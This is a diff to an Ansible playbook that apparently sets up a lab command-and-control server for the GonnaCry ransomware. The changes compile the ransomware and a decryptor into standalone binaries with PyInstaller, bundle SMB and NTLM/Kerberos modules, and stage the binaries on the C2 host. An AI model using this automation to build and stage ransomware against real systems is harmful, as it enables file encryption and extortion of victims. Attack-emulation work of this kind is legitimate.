@@ -27,13 +27,18 @@
           - pycryptodome
           - flask
           - requests
+          - pyinstaller
+          - smbprotocol
         executable: pip3
 
-    - name: Create C2 server directory
+    - name: Create C2 server directories
       file:
-        path: "{{ c2_dir }}"
+        path: "{{ item }}"
         state: directory
         mode: '0700'
+      loop:
+        - "{{ c2_dir }}"
+        - "{{ c2_dir }}/binaries"
 
     - name: Deploy server.py
       copy:
@@ -50,11 +55,57 @@
         - private_key.key
         - public_key.key
 
-    - name: Deploy payload binaries
+    - name: Copy GonnaCry source for build
       copy:
-        src: "{{ gonnacry_server_src }}/binaries/"
-        dest: "{{ c2_dir }}/binaries/"
+        src: "{{ project_root }}/attacks/GonnaCry/src/GonnaCry/"
+        dest: /tmp/gonnacry-build/
+        mode: '0644'
+
+    - name: Build gonnacry binary
+      shell: |
+        export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+        cd /tmp/gonnacry-build
+        python3 -m PyInstaller --onefile --distpath /tmp/gonnacry-dist \
+            --workpath /tmp/gonnacry-work --specpath /tmp/gonnacry-spec \
+            --hidden-import=smbprotocol \
+            --hidden-import=smbclient \
+            --hidden-import=spnego \
+            --hidden-import=spnego.backends \
+            --hidden-import=spnego.backends.ntlm \
+            --hidden-import=spnego.backends.kerberos \
+            --hidden-import=smbprotocol.security_descriptor \
+            --hidden-import=smbprotocol.reparse_point \
+            --name gonnacry main.py
+      args:
+        executable: /bin/bash
+
+    - name: Build decryptor binary
+      shell: |
+        export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+        cd /tmp/gonnacry-build
+        python3 -m PyInstaller --onefile --distpath /tmp/gonnacry-dist \
+            --workpath /tmp/gonnacry-work --specpath /tmp/gonnacry-spec \
+            --hidden-import=smbprotocol \
+            --hidden-import=smbclient \
+            --hidden-import=spnego \
+            --hidden-import=spnego.backends \
+            --hidden-import=spnego.backends.ntlm \
+            --hidden-import=spnego.backends.kerberos \
+            --hidden-import=smbprotocol.security_descriptor \
+            --hidden-import=smbprotocol.reparse_point \
+            --name decryptor decryptor.py
+      args:
+        executable: /bin/bash
+
+    - name: Deploy built binaries
+      copy:
+        src: "/tmp/gonnacry-dist/{{ item }}"
+        dest: "{{ c2_dir }}/binaries/{{ item }}"
         mode: '0755'
+        remote_src: true
+      loop:
+        - gonnacry
+        - decryptor
 
     - name: Install gonnacry-server systemd service
       copy:
